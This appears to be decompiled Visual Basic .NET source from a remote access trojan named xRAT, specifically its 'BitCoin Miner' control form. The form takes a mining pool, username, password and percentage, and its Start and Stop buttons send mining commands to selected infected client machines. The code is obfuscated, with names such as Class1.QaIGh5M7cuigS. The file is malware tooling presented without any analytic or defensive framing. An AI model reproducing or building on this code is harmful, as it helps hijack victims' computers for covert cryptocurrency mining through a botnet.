Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class bitcoinn
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Class2.Class4_0.method_6.SendToSelected(String.Concat(New String() { "MineMan|", Me.TextBox1.Text, "|", Me.TextBox2.Text, "|", Me.TextBox3.Text, "|", Me.TextBox4.Text }))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Class2.Class4_0.method_6.SendToSelected("NanManMinepu")
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(bitcoinn))
            Me.Label1 = New Label
            Me.Label2 = New Label
            Me.Label3 = New Label
            Me.Label4 = New Label
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.TextBox3 = New TextBox
            Me.TextBox4 = New TextBox
            Me.Button1 = New Button
            Me.Button2 = New Button
            Me.SuspendLayout
            Me.Label1.AutoSize = True
            Dim point As New Point(&H15, &H8F)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            Dim size As New Size(&H42, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 0
            Me.Label1.Text = "Percentage:"
            Me.Label2.AutoSize = True
            point = New Point(&H13, 8)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H1F, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 1
            Me.Label2.Text = "Pool:"
            Me.Label3.AutoSize = True
            point = New Point(&H13, &H34)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H3B, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 2
            Me.Label3.Text = "Username:"
            Me.Label4.AutoSize = True
            point = New Point(&H15, &H61)
            Me.Label4.Location = point
            Me.Label4.Name = "Label4"
            size = New Size(&H39, 13)
            Me.Label4.Size = size
            Me.Label4.TabIndex = 3
            Me.Label4.Text = "Password:"
            point = New Point(13, &H18)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&HBD, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 4
            point = New Point(12, &H44)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&HBD, &H15)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 5
            point = New Point(12, &H71)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(&HBD, &H15)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 6
            point = New Point(12, &HA2)
            Me.TextBox4.Location = point
            Me.TextBox4.Name = "TextBox4"
            size = New Size(&HBD, &H15)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = 7
            point = New Point(12, &HBB)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(190, &H23)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 8
            Me.Button1.Text = ":: Start Miner ::"
            Me.Button1.UseVisualStyleBackColor = True
            point = New Point(12, &HE4)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&HBD, &H23)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 9
            Me.Button2.Text = ":: Stop Miner ::"
            Me.Button2.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&HDA, &H116)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.TextBox4)
            Me.Controls.Add(Me.TextBox3)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Label4)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Label1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "bitcoinn"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "BitCoin Miner"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub TextBox2_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub TextBox3_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub TextBox4_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = value
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label3 = value
            End Set
        End Property

        Friend Overridable Property Label4 As Label
            Get
                Return Me._Label4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label4 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox2_TextChanged)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.TextChanged, handler
                End If
                Me._TextBox2 = value
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox3_TextChanged)
                If (Not Me._TextBox3 Is Nothing) Then
                    RemoveHandler Me._TextBox3.TextChanged, handler
                End If
                Me._TextBox3 = value
                If (Not Me._TextBox3 Is Nothing) Then
                    AddHandler Me._TextBox3.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox4_TextChanged)
                If (Not Me._TextBox4 Is Nothing) Then
                    RemoveHandler Me._TextBox4.TextChanged, handler
                End If
                Me._TextBox4 = value
                If (Not Me._TextBox4 Is Nothing) Then
                    AddHandler Me._TextBox4.TextChanged, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("Label4")> _
        Private _Label4 As Label
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        Private icontainer_0 As IContainer
    End Class
End Namespace

